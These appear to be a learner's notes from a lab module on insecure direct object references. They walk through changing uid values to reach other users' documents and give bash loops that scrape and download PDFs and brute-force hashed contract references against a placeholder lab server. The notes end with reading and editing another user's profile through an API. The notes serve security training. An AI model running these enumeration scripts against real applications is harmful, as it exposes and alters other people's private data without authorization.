# Mass IDOR Enumeration

## Insecure Parameters

- Our web application assumes that we are logged in as an employee with user id `uid=1` , Once we click on `Documents`, we are redirected to

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_idor_documents.jpg)

- we get this files 

```sh
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

- this is a `static file IDOR` , We see that the files have a predictable naming pattern, as the file names appear to be using the user `uid` and the month/year as part of the file name
- When we try changing the `uid` to `?uid=2` we get another files

```sh
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

## Mass Enumeration

- we do a bash script that try from differnt values for the uid and we filter the documents 

```sh
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

# Bypassing Encoded References

## Mass Enumeration

- we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script

```sh
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

# IDOR in Insecure APIs

- we have this app

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_idor_get_api.jpg)

- Let's send a `GET` request with another `uid`

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_idor_get_another_user.jpg)

- confirming an `IDOR Information Disclosure vulnerability`

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

- Now, with the user's `uuid` at hand, we can change this user's details by sending a `PUT` request to `/profile/api.php/profile/2`

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_idor_modify_another_user.jpg)


